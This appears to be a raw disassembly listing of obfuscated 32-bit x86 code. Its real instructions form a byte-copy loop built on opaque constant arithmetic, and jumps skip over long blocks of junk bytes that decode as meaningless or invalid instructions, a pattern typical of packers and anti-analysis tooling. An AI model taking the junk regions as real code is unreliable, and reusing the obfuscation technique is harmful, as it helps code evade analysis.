  411c46:	mov    DWORD PTR [ebp-0x2c],0x4521
  411c4d:	mov    DWORD PTR [ebp-0x28],0x2979
  411c54:	mov    DWORD PTR [ebp-0x14],0x9e8
  411c5b:	mov    DWORD PTR [ebp-0x10],0x40e5
  411c62:	mov    ecx,DWORD PTR [ebp-0x4]
  411c65:	mov    eax,DWORD PTR [ebp-0x8]
  411c68:	add    ecx,0x1d04
  411c6e:	xor    ecx,eax
  411c70:	mov    eax,DWORD PTR [ebp-0xc]
  411c73:	and    ecx,0x6f79
  411c79:	imul   ecx,eax
  411c7c:	xor    ecx,0xe33ab1
  411c82:	push   esi
  411c83:	mov    DWORD PTR [ebp-0x4],0x5989
  411c8a:	mov    DWORD PTR [ebp-0x8],0x402c1
  411c91:	mov    DWORD PTR [ebp-0xc],0x4114
  411c98:	mov    eax,DWORD PTR [ebp-0xc]
  411c9b:	mov    esi,DWORD PTR [ebp-0x8]
  411c9e:	xor    edx,edx
  411ca0:	sub    eax,0x6cb6
  411ca5:	div    esi
  411ca7:	mov    edx,DWORD PTR [ebp-0x4]
  411caa:	mov    esi,DWORD PTR [ebp+0xc]
  411cad:	or     eax,edx
  411caf:	xor    eax,0x67f1
  411cb4:	mov    edx,ecx
  411cb6:	sub    edx,eax
  411cb8:	mov    DWORD PTR [ebp-0x4],edx
  411cbb:	mov    eax,DWORD PTR [ebp-0x4]
  411cbe:	mov    edx,DWORD PTR [ebp-0x4]
  411cc1:	mov    dl,BYTE PTR [edx+esi*1]
  411cc4:	mov    esi,DWORD PTR [ebp+0x8]
  411cc7:	mov    BYTE PTR [eax+esi*1],dl
  411cca:	mov    eax,DWORD PTR [ebp-0x10]
  411ccd:	mov    edx,DWORD PTR [ebp-0x14]
  411cd0:	jmp    0x411fd9
  411cd5:	xchg   esi,eax
  411cd6:	mov    dh,0x33
  411cd8:	push   edx
  411cd9:	xor    ebx,DWORD PTR [eax+edi*4-0x46]
  411cdd:	push   eax
  411cde:	ret    0x923c
  411ce1:	pop    ebx
  411ce2:	into   
  411ce3:	iret   
  411ce4:	nop
  411ce5:	mov    WORD PTR [eax-0x42],fs
  411ce8:	mov    esi,0xbebec28e
  411ced:	fistp  QWORD PTR [edx]
  411cef:	add    esp,eax
  411cf1:	dec    edi
  411cf2:	jb     0x411c74
  411cf4:	xor    DWORD PTR [ebp+0x69],eax
  411cf7:	sub    eax,0x8b871790
  411cfc:	add    eax,eax
  411cfe:	out    dx,al
  411cff:	mov    ds:0x8e30d7b,al
  411d04:	call   0xa071:0x90e3fbca
  411d0b:	add    al,0x73
  411d0d:	sub    edi,ebx
  411d0f:	dec    edx
  411d10:	push   esi
  411d11:	jae    0x411ca9
  411d13:	test   BYTE PTR [ebx+0x2cfc2402],bl
  411d19:	inc    esp
  411d1a:	mov    ds,esp
  411d1c:	or     ebx,DWORD PTR [ebp+0x2ec3bad7]
  411d22:	pop    ebp
  411d23:	loopne 0x411ce8
  411d25:	dec    eax
  411d26:	and    al,0x8
  411d28:	out    dx,al
  411d29:	pop    edi
  411d2a:	test   bh,bl
  411d2c:	dec    edx
  411d2d:	jle    0x411cbe
  411d2f:	es inc esp
  411d31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d32:	dec    esi
  411d33:	fsub   st(1),st
  411d35:	or     esp,0x63
  411d38:	rcl    BYTE PTR [edx+0x7be8289e],cl
  411d3e:	dec    ebp
  411d3f:	out    0x62,al
  411d41:	ds pop ds
  411d43:	jge    0x411ce5
  411d45:	jl     0x411da8
  411d47:	sahf   
  411d48:	and    DWORD PTR [edx+0x21],ebx
  411d4b:	jge    0x411d55
  411d4d:	mov    eax,0x7c1fb284
  411d52:	xchg   edi,esi
  411d54:	dec    eax
  411d55:	sahf   
  411d56:	sub    al,0x13
  411d58:	dec    ebp
  411d59:	cmp    ah,dl
  411d5b:	leave  
  411d5c:	frstor [edx-0x3790b12d]
  411d62:	sub    al,0x54
  411d64:	inc    ebp
  411d65:	(bad)  
  411d66:	dec    edi
  411d67:	test   dh,0xc9
  411d6a:	pushf  
  411d6b:	mov    bl,0x92
  411d6d:	fmul   QWORD PTR [esi]
  411d6f:	stos   BYTE PTR es:[edi],al
  411d70:	xlat   BYTE PTR fs:[ebx]
  411d72:	(bad)  
  411d73:	aas    
  411d74:	fsubr  st,st(1)
  411d76:	shr    ebp,0x22
  411d79:	and    DWORD PTR [edx],ebx
  411d7b:	cli    
  411d7c:	and    ecx,DWORD PTR [eax+0x67]
  411d7f:	call   0x7353243f
  411d84:	and    BYTE PTR [eax],0xf
  411d87:	xchg   edx,eax
  411d88:	pop    eax
  411d89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d8a:	pop    edi
  411d8b:	ret    0x1316
  411d8e:	ins    BYTE PTR es:[edi],dx
  411d8f:	adc    eax,0x554348e0
  411d94:	cmp    eax,0x9dfe2b85
  411d99:	pop    si
  411d9b:	jne    0x411d37
  411d9d:	test   DWORD PTR [edx-0x36827e37],0xb9d15d7b
  411da7:	nop
  411da8:	and    eax,0xfdfacfcf
  411dad:	xchg   ecx,eax
  411dae:	jb     0x411d52
  411db0:	adc    dl,0x99
  411db3:	pusha  
  411db4:	mov    ds:0x8f35a6cc,eax
  411db9:	sub    ch,ah
  411dbb:	fcmovb st,st(3)
  411dbd:	inc    ebx
  411dbe:	retf   0xb486
  411dc1:	pop    ecx
  411dc2:	mov    edx,0x3705ef98
  411dc7:	jno    0x411e36
  411dc9:	sysexit 
  411dcb:	or     DWORD PTR [esi-0x29],esp
  411dce:	scas   eax,DWORD PTR es:[edi]
  411dcf:	pushf  
  411dd0:	sbb    ah,BYTE PTR [eax+0x6d]
  411dd3:	or     cl,ch
  411dd5:	div    DWORD PTR [ebx-0x51]
  411dd8:	ss and edi,esp
  411ddb:	dec    edx
  411ddc:	mov    bh,0x97
  411dde:	cmp    DWORD PTR [eax+0x3474742e],ebp
  411de4:	nop
  411de5:	pop    esp
  411de6:	(bad)
  411dea:	aam    0xa0
  411dec:	xor    bh,BYTE PTR [edi]
  411dee:	jge    0x411e4d
  411df0:	mov    edi,0x704727a8
  411df5:	jns    0x411e65
  411df7:	ror    DWORD PTR [esi],1
  411df9:	sub    BYTE PTR [esp+edx*2+0x1a19f169],bh
  411e00:	sub    DWORD PTR [eax+0x38c63e06],0x3b940b9b
  411e0a:	sbb    al,0xb2
  411e0c:	jne    0x411e4b
  411e0e:	mov    eax,DWORD PTR [esi]
  411e10:	out    dx,eax
  411e11:	fdiv   DWORD PTR [ecx+0x317ce3bc]
  411e17:	iret   
  411e18:	sub    eax,0x1eeb46b8
  411e1d:	xor    al,0x9f
  411e1f:	aas    
  411e20:	lock push eax
  411e22:	scas   eax,DWORD PTR es:[edi]
  411e23:	(bad)  
  411e24:	(bad)  
  411e25:	push   edi
  411e26:	inc    edx
  411e27:	in     al,0x7d
  411e29:	cmp    eax,edi
  411e2b:	push   ebx
  411e2c:	ficomp DWORD PTR [edx]
  411e2e:	out    0x3c,eax
  411e30:	adc    eax,0x962a358c
  411e35:	mov    cl,0x2e
  411e37:	cmp    esi,DWORD PTR [edx-0x2e59fc5a]
  411e3d:	inc    eax
  411e3e:	cwde   
  411e3f:	mov    al,al
  411e41:	inc    ecx
  411e42:	into   
  411e43:	and    eax,0xd6def703
  411e48:	push   ebx
  411e49:	xor    bl,ah
  411e4b:	pop    esp
  411e4c:	sbb    eax,0xbf6b9341
  411e51:	jmp    0x411ebc
  411e53:	mov    BYTE PTR fs:[ecx+0xf13d9e0],bl
  411e5a:	mov    BYTE PTR ds:0x608c948a,dh
  411e60:	push   cs
  411e61:	xchg   ecx,eax
  411e62:	cwde   
  411e63:	jp     0x411ecd
  411e65:	inc    ecx
  411e66:	mov    edx,0x1b55706b
  411e6b:	xchg   ebx,eax
  411e6c:	jg     0x411df8
  411e6e:	int    0x51
  411e70:	loopne 0x411e61
  411e72:	and    DWORD PTR [edx+0x2fbf392e],edi
  411e78:	mul    bh
  411e7a:	(bad)  
  411e7b:	jae    0x411e43
  411e7d:	xchg   BYTE PTR [edx],dh
  411e7f:	jg     0x411ea5
  411e81:	push   0x12
  411e83:	push   es
  411e84:	shl    BYTE PTR [ebx-0x4bf503f9],0x4d
  411e8b:	(bad)  
  411e8c:	(bad)  
  411e8e:	ja     0x411f0c
  411e90:	fld    DWORD PTR [eax+0x65]
  411e93:	lea    ebp,[edi+0x0]
  411e96:	inc    edi
  411e97:	jmp    0x583e:0xb55b1dcb
  411e9e:	repnz sbb DWORD PTR ss:[ecx+0x1599693],0x62
  411ea7:	push   ebp
  411ea8:	(bad)  [edi-0x3515a6e0]
  411eae:	and    DWORD PTR [eax],0x7
  411eb1:	sub    DWORD PTR [ebp-0x343e444],ecx
  411eb7:	xor    DWORD PTR [ecx+ecx*8],esp
  411eba:	add    al,BYTE PTR [ebp+0x31acf09]
  411ec0:	(bad)  
  411ec1:	loop   0x411e4d
  411ec3:	inc    ebx
  411ec4:	dec    ecx
  411ec5:	adc    ebx,DWORD PTR [ebp+0x46]
  411ec8:	jge    0x411e69
  411eca:	mov    esp,cs
  411ecc:	call   0xabf3:0xf9342d9c
  411ed3:	push   ds
  411ed4:	dec    edx
  411ed5:	mov    cl,0x29
  411ed7:	out    0xcd,al
  411ed9:	ins    DWORD PTR es:[edi],dx
  411eda:	xchg   esi,eax
  411edb:	out    0x1b,eax
  411edd:	xchg   edi,eax
  411ede:	scas   al,BYTE PTR es:[edi]
  411edf:	sub    ah,BYTE PTR [edx+eax*8-0x5b]
  411ee3:	mov    al,0x9
  411ee5:	and    al,0x39
  411ee7:	dec    ecx
  411ee8:	mov    al,ds:0xe278ce9d
  411eed:	xchg   DWORD PTR [eax+edx*8+0x50],eax
  411ef1:	shl    edi,1
  411ef3:	mov    ebx,0x8635847f
  411ef8:	fld    QWORD PTR [esi+0x9]
  411efb:	sahf   
  411efc:	and    al,0x7d
  411efe:	push   esp
  411eff:	fisttp QWORD PTR [eax-0x110f55a9]
  411f05:	ja     0x411f6a
  411f07:	ffree  st(0)
  411f09:	scas   eax,DWORD PTR es:[edi]
  411f0a:	mov    ch,0xc0
  411f0c:	jmp    0x411f07
  411f0e:	test   al,0xd2
  411f10:	inc    esi
  411f11:	lods   al,BYTE PTR ds:[esi]
  411f12:	mov    DWORD PTR [ecx-0x65],esp
  411f15:	add    DWORD PTR [eax-0x68],eax
  411f18:	in     eax,0x50
  411f1a:	aad    0xbc
  411f1c:	daa    
  411f1d:	outs   dx,DWORD PTR ds:[esi]
  411f1e:	ins    BYTE PTR es:[edi],dx
  411f1f:	sub    al,ch
  411f21:	xor    ebp,DWORD PTR [ecx]
  411f23:	rcl    ah,0xba
  411f26:	mov    ah,0xbb
  411f28:	mov    ebp,cs
  411f2a:	bound  eax,QWORD PTR [esi]
  411f2c:	jnp    0x411f35
  411f2e:	dec    edi
  411f2f:	or     DWORD PTR [ebx],esp
  411f31:	jo     0x411f2a
  411f33:	inc    ecx
  411f34:	adc    edx,DWORD PTR [edx-0x59]
  411f37:	shr    BYTE PTR [eax],0xda
  411f3a:	dec    edi
  411f3b:	addr16 push esi
  411f3d:	ss in  eax,dx
  411f3f:	xor    DWORD PTR [edx-0x51],eax
  411f42:	xor    ebp,ebx
  411f44:	fadd   DWORD PTR [ecx-0x2c4dbcea]
  411f4a:	sub    ebp,edi
  411f4c:	adc    esi,DWORD PTR [ecx-0xc3f1059]
  411f52:	push   es
  411f53:	mov    ds:0x71e2ba3e,eax
  411f58:	int3   
  411f59:	leave  
  411f5a:	pop    edi
  411f5b:	outs   dx,BYTE PTR ds:[esi]
  411f5c:	loopne 0x411f68
  411f5e:	pusha  
  411f5f:	test   BYTE PTR [ecx],bl
  411f61:	ja     0x411f2e
  411f63:	fidivr DWORD PTR [edi+0xd]
  411f66:	dec    esp
  411f67:	mov    ah,0xf7
  411f69:	cwde   
  411f6a:	mov    esp,0x443de0df
  411f6f:	(bad)  
  411f70:	das    
  411f71:	cmp    eax,ecx
  411f73:	jmp    0xb13ef122
  411f78:	cwde   
  411f79:	aam    0xb
  411f7b:	ja     0x411fc3
  411f7d:	ret    
  411f7e:	xchg   ebx,eax
  411f7f:	imul   edx,DWORD PTR [ecx+0x1871d47c],0x6a
  411f86:	test   al,0xd2
  411f88:	jo     0x411f2d
  411f8a:	shl    eax,cl
  411f8c:	xchg   BYTE PTR [ebp-0x7],dl
  411f8f:	add    esp,DWORD PTR [ecx-0x57]
  411f92:	or     DWORD PTR [esp+edx*2+0x49018692],edi
  411f99:	xchg   esi,eax
  411f9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f9b:	cmp    BYTE PTR [edx],ch
  411f9d:	adc    esi,ecx
  411f9f:	in     al,dx
  411fa0:	xchg   ecx,eax
  411fa1:	pop    edx
  411fa2:	sar    DWORD PTR [ecx],cl
  411fa4:	adc    eax,DWORD PTR [edx+eiz*8]
  411fa7:	popa   
  411fa8:	mov    ds:0xc512f531,al
  411fad:	rcr    DWORD PTR [edi+edx*1-0x55],cl
  411fb1:	lahf   
  411fb2:	enter  0x3cc,0x39
  411fb6:	push   esi
  411fb7:	mov    ss:0xd1744255,eax
  411fbd:	popa   
  411fbe:	push   0x10
  411fc0:	lea    esi,[eax]
  411fc2:	(bad)  
  411fc3:	out    0xfa,al
  411fc5:	inc    ebp
  411fc6:	test   al,0x9
  411fc8:	icebp  
  411fc9:	sbb    esi,DWORD PTR [ebx]
  411fcb:	mov    ds,WORD PTR [eax-0x20971968]
  411fd1:	fild   QWORD PTR [ecx-0x7286e5d4]
  411fd7:	cld    
  411fd8:	fisubr DWORD PTR [ecx-0x40]
  411fdb:	nop
  411fdc:	sar    BYTE PTR [ebx],cl
  411fde:	add    al,0x23
  411fe0:	ret    0x400d
  411fe3:	sbb    al,BYTE PTR [eax]
  411fe5:	add    BYTE PTR ds:0x1ac1,dh
  411feb:	add    ecx,eax
  411fed:	mov    eax,DWORD PTR [ebp-0x18]
  411ff0:	mov    edx,0x7380
  411ff5:	sub    edx,eax
  411ff7:	add    edx,DWORD PTR [ebp-0x1c]
  411ffa:	mov    eax,DWORD PTR [ebp-0x20]
  411ffd:	xor    edx,eax
  411fff:	mov    eax,DWORD PTR [ebp-0x24]
  412002:	and    edx,eax
  412004:	mov    eax,DWORD PTR [ebp+0x10]
  412007:	jmp    0x412310
  41200c:	icebp  
  41200d:	or     DWORD PTR [ebp+0x7c3cad28],0xcf30669c
  412017:	nop
  412018:	jne    0x411fbd
  41201a:	jle    0x411feb
  41201c:	pop    esp
  41201d:	mov    si,0x8ebe
  412021:	ret    0xbebe
  412024:	jbe    0x412087
  412026:	retf   
  412027:	ror    DWORD PTR [edx-0x5f],0x14
  41202b:	jp     0x412059
  41202d:	inc    ecx
  41202e:	pop    ebx
  41202f:	mov    ch,0xc2
  412031:	pop    edi
  412032:	add    al,0x89
  412034:	cwde   
  412035:	cdq    
  412036:	js     0x411fbf
  412038:	inc    ebp
  412039:	stos   DWORD PTR es:[edi],eax
  41203a:	and    DWORD PTR [eax-0x4d3f65d7],ebx
  412040:	mov    cl,BYTE PTR [esi+0x1a]
  412043:	mov    eax,0x73f7977c
  412048:	iret   
  412049:	hlt    
  41204a:	ror    dl,0xd8
  41204d:	xor    BYTE PTR [ecx-0x25],cl
  412050:	fild   WORD PTR [ebx-0x5]
  412053:	nop
  412054:	cdq    
  412055:	loop   0x411fde
  412057:	stos   BYTE PTR es:[edi],al
  412058:	dec    ebx
  412059:	xchg   esi,eax
  41205a:	inc    esi
  41205b:	sbb    DWORD PTR [ebp+0x5],edx
  41205e:	pop    ebx
  41205f:	ins    DWORD PTR es:[edi],dx
  412060:	(bad)  
  412061:	fnsetpm(287 only) 
  412063:	fstp   TBYTE PTR [ebx-0x3724b8a9]
  412069:	(bad)  
  41206a:	xchg   edi,eax
  41206b:	xor    BYTE PTR [eax],0xc9
  41206e:	add    al,0xeb
  412070:	ja     0x4120c7
  412072:	xor    DWORD PTR [edi-0x3d],0x57562e8a
  412079:	pop    esp
  41207a:	sar    BYTE PTR [ecx],cl
  41207c:	dec    edi
  41207d:	push   0x1d
  41207f:	lea    ebp,[edi-0x30]
  412082:	mov    al,ds:0x1da220ce
  412087:	and    dl,bh
  412089:	ror    dh,1
  41208b:	js     0x4120dd
  41208d:	sbb    eax,0x6caa0850
  412092:	ret    
  412093:	adc    edx,DWORD PTR [edi]
  412095:	inc    edx
  412096:	or     al,0xb7
  412098:	pop    esp
  412099:	xchg   DWORD PTR [eax+eax*8+0x19],ecx
  41209d:	mov    bh,0x9d
  41209f:	test   BYTE PTR [ebp*2-0x780e0bc5],ah
  4120a6:	pop    ebx
  4120a7:	sbb    ebp,esp
  4120a9:	fdivr  QWORD PTR [ecx-0x22e1a25d]
  4120af:	mov    esi,0x8e68503d
  4120b4:	aam    0x3e
  4120b6:	inc    edi
  4120b7:	inc    esp
  4120b8:	fstp   TBYTE PTR [eax-0x24b5eced]
  4120be:	mov    edx,DWORD PTR [ebp+0x51]
  4120c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4120c2:	out    0xd3,al
  4120c4:	das    
  4120c5:	(bad)  ds:0x2c26eb8e
  4120cb:	jbe    0x412104
  4120cd:	es (bad) 
  4120d0:	pushf  
  4120d1:	adc    BYTE PTR [edx],0xf2
  4120d4:	mov    bl,0xe0
  4120d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120d7:	push   ds
  4120d8:	adc    BYTE PTR [ebx+0x30c05af8],0x3a
  4120df:	cmp    dh,BYTE PTR [ebx]
  4120e1:	mov    al,0xbb
  4120e3:	pop    edx
  4120e4:	ds and eax,0x1beebe08
  4120ea:	pop    ebp
  4120eb:	and    DWORD PTR [edx-0x64],ecx
  4120ee:	jmp    eax
  4120f0:	lods   eax,DWORD PTR ds:[esi]
  4120f1:	sub    ecx,0x1a
  4120f4:	test   al,0x65
  4120f6:	xchg   ebp,eax
  4120f7:	push   0xb3895f11
  4120fc:	gs jo  0x4120ac
  4120ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412100:	push   ss
  412101:	scas   al,BYTE PTR es:[edi]
  412102:	push   0xfffffffc
  412104:	push   DWORD PTR [esi]
  412106:	and    ecx,DWORD PTR [ecx+0x474104be]
  41210c:	add    esp,eax
  41210e:	cmp    eax,0xe2683d29
  412113:	mov    WORD PTR [eax],?
  412115:	mov    bh,0x94
  412117:	pop    esp
  412118:	xchg   ebx,eax
  412119:	fs cmp al,0x54
  41211c:	and    esi,DWORD PTR [ebx+ecx*2+0x5eaf13cf]
  412123:	adc    DWORD PTR [ebp+0x14],edx
  412126:	(bad)  
  412127:	lods   eax,DWORD PTR ds:[esi]
  412128:	inc    ebp
  412129:	ds push 0xffffffdb
  41212c:	push   esp
  41212d:	inc    bh
  41212f:	push   edx
  412130:	out    0x7d,al
  412132:	scas   al,BYTE PTR es:[edi]
  412133:	jae    0x4120ce
  412135:	push   ebp
  412136:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412137:	shl    BYTE PTR [ebp-0xf],cl
  41213a:	stos   DWORD PTR es:[di],eax
  41213c:	sub    ecx,DWORD PTR [eax+0x498058dd]
  412142:	retf   
  412143:	rcl    BYTE PTR [edi+edx*4],0x4
  412147:	xor    DWORD PTR [ecx+edi*1+0x76],eax
  41214b:	repz cmc 
  41214d:	cmp    eax,0xa467d73a
  412152:	icebp  
  412153:	jno    0x4120f8
  412155:	pop    edx
  412156:	cmp    edx,DWORD PTR [eax-0x32]
  412159:	mov    ecx,0xc50e4610
  41215e:	inc    ebx
  41215f:	in     al,0x1f
  412161:	shl    BYTE PTR [ebp+0x0],0x72
  412165:	sbb    BYTE PTR [edi-0x421d7a8c],ah
  41216b:	(bad)  
  41216c:	adc    al,0x2
  41216e:	cmp    DWORD PTR [ebx+0x60f74c91],ebp
  412174:	aas    
  412175:	stc    
  412176:	sub    bl,BYTE PTR ds:0xebe7adc3
  41217c:	shl    BYTE PTR [eax-0x4314ed2a],1
  412182:	cwde   
  412183:	repz sub dl,BYTE PTR [ecx-0x1c9558e5]
  41218a:	pop    edx
  41218b:	mov    eax,0x2150234e
  412190:	xor    ch,BYTE PTR [ebp-0x41cd046a]
  412196:	scas   al,BYTE PTR es:[edi]
  412197:	pushf  
  412198:	jl     0x412218
  41219a:	pop    edx
  41219b:	ja     0x41217c
  41219d:	retf   0xf9d0
  4121a0:	popa   
  4121a1:	xchg   bh,ah
  4121a3:	dec    ebp
  4121a4:	xchg   esp,eax
  4121a5:	call   0x60bf0b1c
  4121aa:	js     0x41218f
  4121ac:	outs   dx,BYTE PTR ds:[esi]
  4121ad:	clc    
  4121ae:	inc    DWORD PTR [eax+0x6d850ebf]
  4121b4:	lock push 0x20
  4121b7:	mov    WORD PTR [ecx-0x69831884],gs
  4121bd:	test   al,0xee
  4121bf:	pop    eax
  4121c0:	ins    DWORD PTR es:[edi],dx
  4121c1:	mov    dh,0xa6
  4121c3:	push   edx
  4121c4:	mov    al,ds:0xd1ddfedb
  4121c9:	add    edx,DWORD PTR [edx-0x43]
  4121cc:	push   ds
  4121cd:	(bad)  
  4121ce:	stos   DWORD PTR es:[edi],eax
  4121cf:	xor    al,bh
  4121d1:	xor    ebx,DWORD PTR [edi]
  4121d3:	mov    es,WORD PTR [esi-0x2c]
  4121d6:	pusha  
  4121d7:	push   0xffffffda
  4121d9:	xor    eax,0x2aa286c3
  4121de:	mov    ss,WORD PTR [ebp+0x7e]
  4121e1:	mov    ebx,0x3a0a591
  4121e6:	fsubr  QWORD PTR [ebp-0x3f6b1fa5]
  4121ec:	loopne 0x4121a6
  4121ee:	ret    0x1524
  4121f1:	out    dx,al
  4121f2:	or     BYTE PTR [eax],0xe5
  4121f5:	sub    eax,0xb38532ab
  4121fa:	aad    0x23
  4121fc:	pop    ebp
  4121fd:	imul   eax,DWORD PTR ds:0x5b8f26df,0xd
  412204:	inc    esp
  412205:	fmul   st(4),st
  412207:	jne    0x412242
  412209:	xchg   esp,eax
  41220a:	and    al,0x6d
  41220c:	push   esp
  41220d:	fwait
  41220e:	add    ah,bl
  412210:	fsub   st,st(1)
  412212:	or     al,ch
  412214:	adc    BYTE PTR [eax+0x166fc97c],cl
  41221a:	or     al,0xa0
  41221c:	jo     0x412261
  41221e:	sub    al,bl
  412220:	pop    eax
  412221:	adc    eax,0x412929e3
  412226:	fdiv   DWORD PTR [esi-0x13]
  412229:	scas   eax,DWORD PTR es:[edi]
  41222a:	ds mov esi,0x439fe8cf
  412230:	adc    eax,0xec7bd3b9
  412235:	dec    ecx
  412236:	imul   esi,DWORD PTR [ecx-0x28],0xfffffff9
  41223a:	mov    ch,0xb
  41223c:	fisubr DWORD PTR [ecx]
  41223e:	data16 cmp BYTE PTR [esi-0x15],ah
  412242:	test   bl,ah
  412244:	aad    0x95
  412246:	es scas al,BYTE PTR es:[edi]
  412248:	and    esi,DWORD PTR [esi]
  41224a:	jne    0x412290
  41224c:	ret    0xe01c
  41224f:	push   edi
  412250:	ja     0x412245
  412252:	push   esp
  412253:	adc    DWORD PTR [ecx-0x10a6190a],esp
  412259:	scas   eax,DWORD PTR es:[edi]
  41225a:	nop
  41225b:	xor    DWORD PTR [edx-0x29],edx
  41225e:	push   0x6c
  412260:	pushf  
  412261:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412262:	dec    edi
  412263:	mov    edi,0xa05f6982
  412268:	ficomp DWORD PTR [ecx+0x433f82a2]
  41226e:	imul   ebp,DWORD PTR [eax],0x1f6602df
  412274:	retf   
  412275:	and    bh,BYTE PTR ds:0x9a9a7335
  41227b:	xchg   esi,eax
  41227c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41227d:	xchg   esp,eax
  41227e:	mov    ecx,0x56766553
  412283:	ins    BYTE PTR es:[edi],dx
  412284:	sbb    DWORD PTR [ebx],esi
  412286:	fbstp  TBYTE PTR [esi-0x57]
  412289:	scas   eax,DWORD PTR es:[edi]
  41228a:	outs   dx,DWORD PTR ds:[esi]
  41228b:	(bad)  
  41228c:	outs   dx,DWORD PTR ds:[esi]
  41228d:	jae    0x412229
  41228f:	jo     0x41224e
  412291:	in     al,dx
  412292:	out    dx,al
  412293:	std    
  412294:	jp     0x412234
  412296:	adc    DWORD PTR [ebp+0x1f084059],esp
  41229c:	sbb    dh,BYTE PTR [ebp-0x3a21b61]
  4122a2:	cs xchg ebx,eax
  4122a4:	lds    edx,FWORD PTR [ebp+ebp*4+0x35d10bb8]
  4122ab:	push   ebx
  4122ac:	mov    dl,0xd7
  4122ae:	sub    ebp,ebx
  4122b0:	and    BYTE PTR [ebx-0x7c7f62fc],bh
  4122b6:	jge    0x41226a
  4122b8:	push   esi
  4122b9:	mov    edx,0xe0c46393
  4122be:	inc    esp
  4122bf:	cmc    
  4122c0:	sbb    eax,0xcde5a512
  4122c5:	adc    DWORD PTR [edx+0x43],esp
  4122c8:	xchg   edx,eax
  4122c9:	mov    DWORD PTR ss:[ebx],0x1a064e6d
  4122d0:	mov    bh,0xd0
  4122d2:	fsubr  QWORD PTR [eax+0x4943d96a]
  4122d8:	xor    eax,0x5e520d2c
  4122dd:	je     0x412341
  4122df:	aaa    
  4122e0:	es out 0xbc,al
  4122e3:	retf   
  4122e4:	pop    ebx
  4122e5:	fstp   TBYTE PTR [ecx-0x18]
  4122e8:	(bad)  
  4122ea:	push   ebp
  4122eb:	into   
  4122ec:	lea    esi,[ebx-0x54]
  4122ef:	adc    ah,BYTE PTR [edi+0x120c5206]
  4122f5:	jmp    0x4249:0x43cc7b0a
  4122fc:	add    bl,BYTE PTR [ebp+0x54e0c078]
  412302:	inc    ebx
  412303:	(bad)  [eax-0x18fae54c]
  412309:	push   edx
  41230a:	sbb    esi,esp
  41230c:	retf   0x8d99
  41230f:	pushf  
  412310:	xor    edx,0x7015
  412316:	sub    eax,edx
  412318:	mov    edx,DWORD PTR [ebp-0x28]
  41231b:	mov    esi,DWORD PTR [ebp-0x2c]
  41231e:	and    edx,0x2a7b
  412324:	lea    edx,[edx+esi*1-0x3571]
  41232b:	mov    esi,DWORD PTR [ebp-0x30]
  41232e:	shr    edx,1
  412330:	or     edx,esi
  412332:	mov    esi,ecx
  412334:	sub    esi,edx
  412336:	add    esi,0x4751
  41233c:	cmp    esi,eax
  41233e:	jbe    0x411c83
  412344:	pop    esi
  412345:	leave  
  412346:	ret    0xc
  412349:	push   ebp
  41234a:	mov    ebp,esp
  41234c:	sub    esp,0x80
  412352:	push   ebx
  412353:	jmp    0x41268c
  412358:	push   0xffffffd2
  41235a:	jnp    0x4122dc
  41235c:	jl     0x412306
  41235e:	mov    edx,0xa0fab73b
  412363:	nop
  412364:	dec    ecx
  412365:	mov    esp,0x6c2ccf80
  41236a:	mov    esi,0xbec4edbe
  41236f:	mov    esi,0xc1bf8126
  412374:	int    0x6c
  412376:	popf   
  412377:	mov    ebx,DWORD PTR [edx-0x4e]
  41237a:	stc    
  41237b:	and    eax,0x73774e4
  412380:	(bad)  
  412381:	cmp    ebp,edi
  412383:	scas   al,BYTE PTR es:[edi]
  412384:	dec    ecx
  412385:	sbb    al,0x8e
  412387:	ror    BYTE PTR [esi],1
  412389:	mov    BYTE PTR ds:0x2551b0d6,ch
  41238f:	mov    esp,0x84a9928b
  412394:	aas    
  412395:	add    eax,DWORD PTR [edi-0x6bcdb2f]
  41239b:	mov    ds:0x937a829f,al
  4123a0:	jp     0x4123af
  4123a2:	mov    ecx,0x46cae3c4
  4123a7:	mov    edi,0x3b21f3ce
  4123ac:	in     eax,0x6c
  4123ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123af:	push   0xb33b97c8
  4123b4:	lds    esp,FWORD PTR [ebx-0x2d]
  4123b7:	ror    DWORD PTR [ebx],0x48
  4123ba:	sub    DWORD PTR [ecx-0x52a840d6],edi
  4123c0:	cdq    
  4123c1:	xor    ebx,DWORD PTR [ebx+0x6b9ff62e]
  4123c7:	xchg   DWORD PTR [edi-0x1ccdaf42],esp
  4123cd:	cmc    
  4123ce:	sahf   
  4123cf:	add    ecx,esp
  4123d1:	scas   eax,DWORD PTR es:[edi]
  4123d2:	clc    
  4123d3:	mov    ebp,0x6e02b35c
  4123d8:	jmp    0x1ed3:0xc6657cca
  4123df:	and    BYTE PTR [edx],0x7
  4123e2:	mov    ecx,0x75ffee76
  4123e7:	retf   
  4123e8:	outs   dx,BYTE PTR ds:[esi]
  4123e9:	add    BYTE PTR fs:[ebx],0x8
  4123ed:	cs test al,0xd9
  4123f0:	push   es
  4123f1:	push   gs
  4123f3:	aam    0x29
  4123f5:	mov    bl,0x92
  4123f7:	xchg   BYTE PTR [esi-0x72d35675],bh
  4123fd:	in     al,0x4a
  4123ff:	push   esi
  412400:	push   es
  412401:	arpl   WORD PTR [ebp-0x18d6d7ce],dx
  412407:	pop    es
  412408:	pop    es
  412409:	rcl    dl,0xc7
  41240c:	mov    BYTE PTR [eax+0x40f0db58],bh
  412412:	add    al,0x47
  412414:	ss imul edx,DWORD PTR ss:[ecx],0x7383800d
  41241c:	mov    edx,0x85215488
  412421:	ins    BYTE PTR es:[edi],dx
  412422:	sub    BYTE PTR [edi+ebp*2+0x53b846fa],0xc7
  41242a:	daa    
  41242b:	jno    0x41241e
  41242d:	lods   al,BYTE PTR ds:[esi]
  41242e:	dec    eax
  41242f:	add    BYTE PTR [esi+0x67750aa8],dl
  412435:	shr    BYTE PTR [ebx+0x47],1
  412438:	mov    edx,0xb4d120a2
  41243d:	pop    ss
  41243e:	shl    BYTE PTR [eax+ebp*2-0x64],1
  412442:	mov    DWORD PTR [eax-0x271d03d],ecx
  412448:	mov    gs,WORD PTR [edx-0x7ea4290]
